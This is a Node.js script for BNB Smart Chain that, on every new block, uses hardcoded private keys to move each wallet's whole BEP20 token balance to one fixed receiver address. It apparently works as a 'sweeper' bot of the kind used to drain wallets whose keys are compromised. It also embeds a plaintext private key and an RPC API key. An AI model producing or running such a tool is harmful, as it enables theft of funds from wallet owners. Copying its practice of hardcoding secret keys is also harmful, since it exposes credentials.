const { EtherscanProvider } = require('@ethersproject/providers')
const { sign } = require('crypto')
const { ethers, Wallet, Signer } = require('ethers')
const { TransactionDescription, TransactionTypes } = require('ethers/lib/utils')

const provider = new ethers.providers.JsonRpcProvider("https://bsc-mainnet.rpcfast.com?api_key=xbhWBI1Wkguk8SNMu1bvvLurPGLXmgwYeC4S6g2H7WdwFigZSmPWVZRxrskEQwIf")

const addressReceiver = '0xbEF25E0b188F0090C7ac88488D97b2AAc77B4d4D'

const privateKeys = ["61cc3dd9e170b5f94a7e57935beb64d0d53c2aa76f37ed2f3644b950c27c2a66"] 

process.on('uncaughtException', function(err) {
    console.log('Caught exception: ' + err);
  });

const contractAddress = "0x20f663cea80face82acdfa3aae6862d246ce0333" 

const BEP20ABI = [
    "function transfer(address to, uint amount)"
];

const balABI = [{
    "constant": true,
    "inputs": [{
        "internalType": "address",
        "name": "account",
        "type": "address"
    }],
    "name": "balanceOf",
    "outputs": [{
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}]

const bot = async =>{
    provider.on('block', async () => {
        console.log('Scanning new block.. ;)');
        for (let i = 0; i < privateKeys.length; i++){
            const _target = new ethers.Wallet(privateKeys[i]);
            const target = _target.connect(provider);
            const balance = await provider.getBalance(target.address);
            const nonce = await provider.getTransactionCount(target.address)

            // Balance
            const signer = new ethers.Wallet(privateKeys[i], provider);
            const _contract = new ethers.Contract(contractAddress, balABI, provider);
            const contract = _contract.connect(signer);
            const tokenBal = await contract.balanceOf(target.address);

            // Data
            let iface = new ethers.utils.Interface(BEP20ABI);
            let data = iface.encodeFunctionData("transfer", [addressReceiver, tokenBal])

             // Custom Gas Price       
            const gasPrice = provider.getGasPrice()
            
            if (tokenBal > 10){ 


                try {
                    await target.sendTransaction({
                        from: target.address,
                        to: contractAddress,
                        gasLimit: 120000,
                        gasPrice: gasPrice,
                        nonce: nonce,
                        data: data,
                    });
                    console.log(`Transfer broadcasted without errors..`);
                } catch(e){
                    console.log(`error: ${e}`);
                }
            }
        }
    })
}
bot();